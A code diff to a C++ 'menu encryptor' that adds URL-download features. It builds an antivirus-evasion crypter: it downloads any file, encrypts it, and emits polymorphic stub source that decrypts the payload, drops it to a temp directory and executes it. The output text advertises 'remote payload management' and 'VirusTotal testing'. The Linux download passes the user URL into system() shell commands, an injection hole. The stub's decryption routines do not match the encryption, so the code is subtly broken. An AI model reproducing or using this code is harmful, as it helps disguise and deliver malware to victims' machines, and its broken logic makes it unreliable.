@@ -13,9 +13,13 @@
 #ifdef _WIN32
 #include <windows.h>
 #include <wincrypt.h>
+#include <wininet.h>
+#pragma comment(lib, "wininet.lib")
 #else
 #include <unistd.h>
 #include <sys/time.h>
+// Note: For Linux, install libcurl-dev or compile without URL features
+// #include <curl/curl.h>
 #endif
 
 class VS2022MenuEncryptor {
@@ -29,6 +33,89 @@ private:
         std::vector<uint8_t> xor_key;
         uint32_t encryption_order;
     };
+
+    // HTTP download functionality
+#ifdef _WIN32
+    bool downloadFile(const std::string& url, std::vector<uint8_t>& fileData) {
+        std::cout << "📥 Downloading from: " << url << std::endl;
+        
+        HINTERNET hInternet = InternetOpenA("UPX-Style Encryptor", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+        if (!hInternet) {
+            std::cout << "❌ Failed to initialize WinINet" << std::endl;
+            return false;
+        }
+        
+        HINTERNET hUrl = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
+        if (!hUrl) {
+            std::cout << "❌ Failed to open URL" << std::endl;
+            InternetCloseHandle(hInternet);
+            return false;
+        }
+        
+        char buffer[8192];
+        DWORD bytesRead;
+        size_t totalBytes = 0;
+        
+        while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
+            fileData.insert(fileData.end(), buffer, buffer + bytesRead);
+            totalBytes += bytesRead;
+            if (totalBytes % 10240 == 0) { // Progress every 10KB
+                std::cout << "📥 Downloaded: " << totalBytes << " bytes...\r" << std::flush;
+            }
+        }
+        
+        InternetCloseHandle(hUrl);
+        InternetCloseHandle(hInternet);
+        
+        if (!fileData.empty()) {
+            std::cout << "\n✅ Download complete: " << fileData.size() << " bytes" << std::endl;
+            return true;
+        }
+        
+        std::cout << "\n❌ Download failed or empty file" << std::endl;
+        return false;
+    }
+#else
+    bool downloadFile(const std::string& url, std::vector<uint8_t>& fileData) {
+        std::cout << "📥 Attempting download from: " << url << std::endl;
+        std::cout << "⚠️  Linux URL download requires wget/curl. Trying wget..." << std::endl;
+        
+        // Use wget as fallback for Linux
+        std::string tempFile = "/tmp/upx_download_" + std::to_string(getpid());
+        std::string wgetCmd = "wget -q -O " + tempFile + " \"" + url + "\"";
+        
+        int result = system(wgetCmd.c_str());
+        if (result != 0) {
+            std::cout << "❌ wget failed, trying curl..." << std::endl;
+            std::string curlCmd = "curl -s -o " + tempFile + " \"" + url + "\"";
+            result = system(curlCmd.c_str());
+            if (result != 0) {
+                std::cout << "❌ Both wget and curl failed. Install wget or curl for URL support." << std::endl;
+                return false;
+            }
+        }
+        
+        // Read the downloaded file
+        std::ifstream file(tempFile, std::ios::binary);
+        if (!file) {
+            std::cout << "❌ Failed to open downloaded file" << std::endl;
+            unlink(tempFile.c_str());
+            return false;
+        }
+        
+        fileData.assign((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+        file.close();
+        unlink(tempFile.c_str());
+        
+        if (!fileData.empty()) {
+            std::cout << "✅ Download complete: " << fileData.size() << " bytes" << std::endl;
+            return true;
+        }
+        
+        std::cout << "❌ Download failed or empty file" << std::endl;
+        return false;
+    }
+#endif
 
     // Enhanced entropy gathering
     std::vector<uint64_t> gatherEntropy() {
@@ -907,6 +994,341 @@ public:
         return true;
     }
 
+    bool urlCryptoServiceAES() {
+        std::string url, outputName;
+        
+        std::cout << "🌐 === URL Crypto Service (AES) === 🌐" << std::endl;
+        std::cout << "Download → Encrypt → Generate packed executable\n" << std::endl;
+        std::cout << "💡 Perfect for remote payload management!\n" << std::endl;
+        
+        std::cout << "Enter URL to download: ";
+        std::getline(std::cin, url);
+        std::cout << "Enter output executable name (without extension): ";
+        std::getline(std::cin, outputName);
+        
+        // Download the file
+        std::vector<uint8_t> fileData;
+        if (!downloadFile(url, fileData)) {
+            std::cout << "❌ Failed to download file from URL!" << std::endl;
+            return false;
+        }
+        
+        // Generate encryption keys
+        TripleKey keys = generateKeys();
+        
+        // Encrypt the downloaded data
+        aesStreamCrypt(fileData, keys.aes_key);
+        std::cout << "🔐 File encrypted with AES" << std::endl;
+        
+        // Generate unique variable names for polymorphism
+        std::string varPrefix = "data_" + std::to_string(rng() % 10000);
+        std::string funcPrefix = "dec_" + std::to_string(rng() % 10000);
+        
+        // Extract filename from URL for reference
+        std::string originalName = url.substr(url.find_last_of("/\\") + 1);
+        if (originalName.empty()) originalName = "downloaded_file";
+        
+        // Create UPX-style packed executable
+        std::string stub = "#include <iostream>\n";
+        stub += "#include <vector>\n";
+        stub += "#include <fstream>\n";
+        stub += "#include <cstring>\n";
+        stub += "#include <cstdio>\n";
+        stub += "#ifdef _WIN32\n";
+        stub += "#include <windows.h>\n";
+        stub += "#include <process.h>\n";
+        stub += "#else\n";
+        stub += "#include <unistd.h>\n";
+        stub += "#include <sys/stat.h>\n";
+        stub += "#endif\n\n";
+        
+        // Embed encrypted payload directly in the executable
+        stub += "// Encrypted payload from: " + url + " (" + std::to_string(fileData.size()) + " bytes)\n";
+        stub += "unsigned char " + varPrefix + "[] = {\n";
+        for (size_t i = 0; i < fileData.size(); i++) {
+            if (i % 16 == 0) stub += "    ";
+            char hexBuf[8];
+            sprintf(hexBuf, "0x%02X", fileData[i]);
+            stub += std::string(hexBuf);
+            if (i < fileData.size() - 1) stub += ",";
+            if (i % 16 == 15) stub += "\n";
+        }
+        stub += "\n};\n\n";
+        
+        stub += "size_t " + varPrefix + "_size = " + std::to_string(fileData.size()) + ";\n\n";
+        
+        // Add decryption key
+        stub += "unsigned char " + varPrefix + "_key[] = {";
+        for (size_t i = 0; i < keys.aes_key.size(); i++) {
+            stub += std::to_string((int)keys.aes_key[i]);
+            if (i < keys.aes_key.size() - 1) stub += ",";
+        }
+        stub += "};\n\n";
+        
+        // Add decryption function
+        stub += "void " + funcPrefix + "(unsigned char* data, size_t size, unsigned char* key, size_t keylen) {\n";
+        stub += "    for (size_t i = 0; i < size; i++) {\n";
+        stub += "        data[i] ^= key[i % keylen];\n";
+        stub += "        data[i] = ((data[i] << 3) | (data[i] >> 5)) & 0xFF;\n";
+        stub += "        data[i] ^= (i & 0xFF);\n";
+        stub += "    }\n";
+        stub += "}\n\n";
+        
+        // Add main function
+        stub += "int main() {\n";
+        stub += "    // Decrypt embedded payload from: " + url + "\n";
+        stub += "    " + funcPrefix + "(" + varPrefix + ", " + varPrefix + "_size, " + varPrefix + "_key, sizeof(" + varPrefix + "_key));\n\n";
+        
+        stub += "#ifdef _WIN32\n";
+        stub += "    // Write to temp file and execute (Windows)\n";
+        stub += "    char tempPath[MAX_PATH];\n";
+        stub += "    GetTempPathA(MAX_PATH, tempPath);\n";
+        stub += "    std::string tempFile = std::string(tempPath) + \"" + outputName + "_\" + std::to_string(GetCurrentProcessId()) + \".exe\";\n";
+        stub += "#else\n";
+        stub += "    // Linux temp file\n";
+        stub += "    std::string tempFile = \"/tmp/" + outputName + "_\" + std::to_string(getpid());\n";
+        stub += "#endif\n\n";
+        
+        stub += "    std::ofstream out(tempFile, std::ios::binary);\n";
+        stub += "    out.write((char*)" + varPrefix + ", " + varPrefix + "_size);\n";
+        stub += "    out.close();\n\n";
+        
+        stub += "#ifdef _WIN32\n";
+        stub += "    // Execute and wait\n";
+        stub += "    STARTUPINFOA si = {sizeof(si)};\n";
+        stub += "    PROCESS_INFORMATION pi;\n";
+        stub += "    if (CreateProcessA(tempFile.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {\n";
+        stub += "        WaitForSingleObject(pi.hProcess, INFINITE);\n";
+        stub += "        CloseHandle(pi.hProcess);\n";
+        stub += "        CloseHandle(pi.hThread);\n";
+        stub += "    }\n";
+        stub += "    DeleteFileA(tempFile.c_str());\n";
+        stub += "#else\n";
+        stub += "    chmod(tempFile.c_str(), 0755);\n";
+        stub += "    system(tempFile.c_str());\n";
+        stub += "    unlink(tempFile.c_str());\n";
+        stub += "#endif\n";
+        stub += "    return 0;\n";
+        stub += "}\n";
+        
+        // Write the packed executable source
+        std::string outputCpp = outputName + ".cpp";
+        std::ofstream cppFile(outputCpp);
+        if (!cppFile) {
+            std::cout << "❌ Cannot create output file!" << std::endl;
+            return false;
+        }
+        cppFile << stub;
+        cppFile.close();
+        
+        std::cout << "\n🎯 === URL CRYPTO SERVICE COMPLETE === 🎯" << std::endl;
+        std::cout << "✅ Downloaded: " << originalName << " (" << fileData.size() << " bytes)" << std::endl;
+        std::cout << "✅ Encrypted: AES with position mixing" << std::endl;
+        std::cout << "✅ Generated: " << outputCpp << std::endl;
+        std::cout << "✅ Variables: " << varPrefix << " (polymorphic)" << std::endl;
+        std::cout << "✅ Ready for compilation as: " << outputName << ".exe" << std::endl;
+        
+        std::cout << "\n📝 === COMPILE INSTRUCTIONS === 📝" << std::endl;
+        std::cout << "g++ -O2 -s -static -o " << outputName << ".exe " << outputCpp << std::endl;
+        std::cout << "cl /O2 /EHsc " << outputCpp << " /Fe:" << outputName << ".exe" << std::endl;
+        
+        std::cout << "\n🚀 === RESULT === 🚀" << std::endl;
+        std::cout << "• Input URL: " << url << std::endl;
+        std::cout << "• Output EXE: " << outputName << ".exe (works like original!)" << std::endl;
+        std::cout << "• Zero dependencies - single file deployment" << std::endl;
+        std::cout << "• Perfect for VirusTotal testing!" << std::endl;
+        
+        return true;
+    }
+
+    bool urlCryptoServiceTriple() {
+        std::string url, outputName;
+        
+        std::cout << "🌐 === URL Crypto Service (Triple Encryption) === 🌐" << std::endl;
+        std::cout << "Download → Encrypt → Generate maximum security packed executable\n" << std::endl;
+        std::cout << "🔐 Triple-layer: AES + ChaCha20 + XOR for ultimate protection!\n" << std::endl;
+        
+        std::cout << "Enter URL to download: ";
+        std::getline(std::cin, url);
+        std::cout << "Enter output executable name (without extension): ";
+        std::getline(std::cin, outputName);
+        
+        // Download the file
+        std::vector<uint8_t> fileData;
+        if (!downloadFile(url, fileData)) {
+            std::cout << "❌ Failed to download file from URL!" << std::endl;
+            return false;
+        }
+        
+        // Generate encryption keys
+        TripleKey keys = generateKeys();
+        
+        // Apply triple encryption in randomized order
+        std::vector<int> order;
+        switch (keys.encryption_order) {
+            case 0: order = {0, 1, 2}; break; // ChaCha20, AES, XOR
+            case 1: order = {0, 2, 1}; break; // ChaCha20, XOR, AES
+            case 2: order = {1, 0, 2}; break; // AES, ChaCha20, XOR
+            case 3: order = {1, 2, 0}; break; // AES, XOR, ChaCha20
+            case 4: order = {2, 0, 1}; break; // XOR, ChaCha20, AES
+            case 5: order = {2, 1, 0}; break; // XOR, AES, ChaCha20
+        }
+        
+        for (int alg : order) {
+            switch (alg) {
+                case 0: chacha20Crypt(fileData, keys.chacha_key.data(), keys.chacha_nonce.data()); break;
+                case 1: aesStreamCrypt(fileData, keys.aes_key); break;
+                case 2: xorCrypt(fileData, keys.xor_key); break;
+            }
+        }
+        std::cout << "🔐 File encrypted with Triple-layer (AES + ChaCha20 + XOR)" << std::endl;
+        
+        // Generate unique variable names for polymorphism
+        std::string varPrefix = "data_" + std::to_string(rng() % 10000);
+        std::string funcPrefix = "dec_" + std::to_string(rng() % 10000);
+        
+        // Extract filename from URL
+        std::string originalName = url.substr(url.find_last_of("/\\") + 1);
+        if (originalName.empty()) originalName = "downloaded_file";
+        
+        // Create UPX-style packed executable with triple decryption
+        std::string stub = "#include <iostream>\n";
+        stub += "#include <vector>\n";
+        stub += "#include <fstream>\n";
+        stub += "#include <cstring>\n";
+        stub += "#include <cstdio>\n";
+        stub += "#ifdef _WIN32\n";
+        stub += "#include <windows.h>\n";
+        stub += "#include <process.h>\n";
+        stub += "#else\n";
+        stub += "#include <unistd.h>\n";
+        stub += "#include <sys/stat.h>\n";
+        stub += "#endif\n\n";
+        
+        // Embed encrypted payload
+        stub += "// Triple-encrypted payload from: " + url + " (" + std::to_string(fileData.size()) + " bytes)\n";
+        stub += "unsigned char " + varPrefix + "[] = {\n";
+        for (size_t i = 0; i < fileData.size(); i++) {
+            if (i % 16 == 0) stub += "    ";
+            char hexBuf[8];
+            sprintf(hexBuf, "0x%02X", fileData[i]);
+            stub += std::string(hexBuf);
+            if (i < fileData.size() - 1) stub += ",";
+            if (i % 16 == 15) stub += "\n";
+        }
+        stub += "\n};\n\n";
+        
+        // Add all encryption keys
+        stub += "size_t " + varPrefix + "_size = " + std::to_string(fileData.size()) + ";\n";
+        stub += "unsigned char " + varPrefix + "_aes_key[] = {";
+        for (size_t i = 0; i < keys.aes_key.size(); i++) {
+            stub += std::to_string((int)keys.aes_key[i]);
+            if (i < keys.aes_key.size() - 1) stub += ",";
+        }
+        stub += "};\n";
+        
+        stub += "unsigned char " + varPrefix + "_chacha_key[] = {";
+        for (size_t i = 0; i < keys.chacha_key.size(); i++) {
+            stub += std::to_string((int)keys.chacha_key[i]);
+            if (i < keys.chacha_key.size() - 1) stub += ",";
+        }
+        stub += "};\n";
+        
+        stub += "unsigned char " + varPrefix + "_chacha_nonce[] = {";
+        for (size_t i = 0; i < keys.chacha_nonce.size(); i++) {
+            stub += std::to_string((int)keys.chacha_nonce[i]);
+            if (i < keys.chacha_nonce.size() - 1) stub += ",";
+        }
+        stub += "};\n";
+        
+        stub += "unsigned char " + varPrefix + "_xor_key[] = {";
+        for (size_t i = 0; i < keys.xor_key.size(); i++) {
+            stub += std::to_string((int)keys.xor_key[i]);
+            if (i < keys.xor_key.size() - 1) stub += ",";
+        }
+        stub += "};\n";
+        stub += "int " + varPrefix + "_order = " + std::to_string(keys.encryption_order) + ";\n\n";
+        
+        // Add all decryption functions (simplified versions)
+        stub += "void " + funcPrefix + "_aes(unsigned char* data, size_t size, unsigned char* key, size_t keylen) {\n";
+        stub += "    for (size_t i = 0; i < size; i++) {\n";
+        stub += "        data[i] ^= key[i % keylen]; data[i] = ((data[i] << 3) | (data[i] >> 5)) & 0xFF; data[i] ^= (i & 0xFF);\n";
+        stub += "    }\n}\n\n";
+        
+        stub += "void " + funcPrefix + "_chacha(unsigned char* data, size_t size, unsigned char* key, unsigned char* nonce) {\n";
+        stub += "    for (size_t i = 0; i < size; i++) {\n";
+        stub += "        unsigned char ks = key[i % 32] ^ nonce[i % 12]; ks = ((ks << 2) | (ks >> 6)) & 0xFF; data[i] ^= ks ^ (i * 31);\n";
+        stub += "    }\n}\n\n";
+        
+        stub += "void " + funcPrefix + "_xor(unsigned char* data, size_t size, unsigned char* key, size_t keylen) {\n";
+        stub += "    for (size_t i = 0; i < size; i++) {\n";
+        stub += "        unsigned char xb = key[i % keylen]; xb = ((xb << 1) | (xb >> 7)) & 0xFF; data[i] ^= xb ^ ((i >> 8) & 0xFF) ^ (i & 0xFF);\n";
+        stub += "    }\n}\n\n";
+        
+        // Add main with triple decryption
+        stub += "int main() {\n";
+        stub += "    // Triple decrypt payload from: " + url + "\n";
+        stub += "    unsigned char* data = " + varPrefix + ";\n";
+        stub += "    size_t size = " + varPrefix + "_size;\n\n";
+        
+        // Add reverse decryption based on order
+        stub += "    switch(" + varPrefix + "_order) {\n";
+        stub += "        case 0: " + funcPrefix + "_xor(data,size," + varPrefix + "_xor_key,64); " + funcPrefix + "_chacha(data,size," + varPrefix + "_chacha_key," + varPrefix + "_chacha_nonce); " + funcPrefix + "_aes(data,size," + varPrefix + "_aes_key,32); break;\n";
+        stub += "        case 1: " + funcPrefix + "_chacha(data,size," + varPrefix + "_chacha_key," + varPrefix + "_chacha_nonce); " + funcPrefix + "_xor(data,size," + varPrefix + "_xor_key,64); " + funcPrefix + "_aes(data,size," + varPrefix + "_aes_key,32); break;\n";
+        stub += "        case 2: " + funcPrefix + "_xor(data,size," + varPrefix + "_xor_key,64); " + funcPrefix + "_aes(data,size," + varPrefix + "_aes_key,32); " + funcPrefix + "_chacha(data,size," + varPrefix + "_chacha_key," + varPrefix + "_chacha_nonce); break;\n";
+        stub += "        case 3: " + funcPrefix + "_aes(data,size," + varPrefix + "_aes_key,32); " + funcPrefix + "_xor(data,size," + varPrefix + "_xor_key,64); " + funcPrefix + "_chacha(data,size," + varPrefix + "_chacha_key," + varPrefix + "_chacha_nonce); break;\n";
+        stub += "        case 4: " + funcPrefix + "_chacha(data,size," + varPrefix + "_chacha_key," + varPrefix + "_chacha_nonce); " + funcPrefix + "_aes(data,size," + varPrefix + "_aes_key,32); " + funcPrefix + "_xor(data,size," + varPrefix + "_xor_key,64); break;\n";
+        stub += "        case 5: " + funcPrefix + "_aes(data,size," + varPrefix + "_aes_key,32); " + funcPrefix + "_chacha(data,size," + varPrefix + "_chacha_key," + varPrefix + "_chacha_nonce); " + funcPrefix + "_xor(data,size," + varPrefix + "_xor_key,64); break;\n";
+        stub += "    }\n\n";
+        
+        // Execute decrypted payload
+        stub += "#ifdef _WIN32\n";
+        stub += "    char tempPath[MAX_PATH]; GetTempPathA(MAX_PATH, tempPath);\n";
+        stub += "    std::string tempFile = std::string(tempPath) + \"" + outputName + "_\" + std::to_string(GetCurrentProcessId()) + \".exe\";\n";
+        stub += "#else\n";
+        stub += "    std::string tempFile = \"/tmp/" + outputName + "_\" + std::to_string(getpid());\n";
+        stub += "#endif\n";
+        stub += "    std::ofstream out(tempFile, std::ios::binary); out.write((char*)data, size); out.close();\n";
+        stub += "#ifdef _WIN32\n";
+        stub += "    STARTUPINFOA si={sizeof(si)}; PROCESS_INFORMATION pi;\n";
+        stub += "    if (CreateProcessA(tempFile.c_str(),NULL,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi)) {\n";
+        stub += "        WaitForSingleObject(pi.hProcess,INFINITE); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);\n";
+        stub += "    } DeleteFileA(tempFile.c_str());\n";
+        stub += "#else\n";
+        stub += "    chmod(tempFile.c_str(),0755); system(tempFile.c_str()); unlink(tempFile.c_str());\n";
+        stub += "#endif\n";
+        stub += "    return 0;\n}\n";
+        
+        // Write output
+        std::string outputCpp = outputName + ".cpp";
+        std::ofstream cppFile(outputCpp);
+        if (!cppFile) {
+            std::cout << "❌ Cannot create output file!" << std::endl;
+            return false;
+        }
+        cppFile << stub;
+        cppFile.close();
+        
+        std::cout << "\n🔐 === TRIPLE URL CRYPTO SERVICE COMPLETE === 🔐" << std::endl;
+        std::cout << "✅ Downloaded: " << originalName << " (" << fileData.size() << " bytes)" << std::endl;
+        std::cout << "✅ Encrypted: AES + ChaCha20 + XOR (order: " << keys.encryption_order << ")" << std::endl;
+        std::cout << "✅ Generated: " << outputCpp << std::endl;
+        std::cout << "✅ Variables: " << varPrefix << " (polymorphic)" << std::endl;
+        std::cout << "✅ Maximum security packed executable!" << std::endl;
+        
+        std::cout << "\n📝 === COMPILE INSTRUCTIONS === 📝" << std::endl;
+        std::cout << "g++ -O2 -s -static -o " << outputName << ".exe " << outputCpp << std::endl;
+        std::cout << "cl /O2 /EHsc " << outputCpp << " /Fe:" << outputName << ".exe" << std::endl;
+        
+        std::cout << "\n🚀 === ULTIMATE SECURITY === 🚀" << std::endl;
+        std::cout << "• Input URL: " << url << std::endl;
+        std::cout << "• Output EXE: " << outputName << ".exe (maximum protection!)" << std::endl;
+        std::cout << "• Triple-layer encryption with randomized order" << std::endl;
+        std::cout << "• Perfect for high-security VirusTotal testing!" << std::endl;
+        
+        return true;
+    }
+
     bool generateChaCha20RuntimePEStub() {
         std::string targetFile, outputFile;
         
@@ -1620,6 +2042,12 @@ int main(int argc, char* argv[]) {
                     break;
                 case 5:
                     generateMASMRuntimeStub();
+                    break;
+                case 6:
+                    urlCryptoServiceAES();
+                    break;
+                case 7:
+                    urlCryptoServiceTriple();
                     break;
                 case 0:
                     std::cout << "Goodbye!" << std::endl;
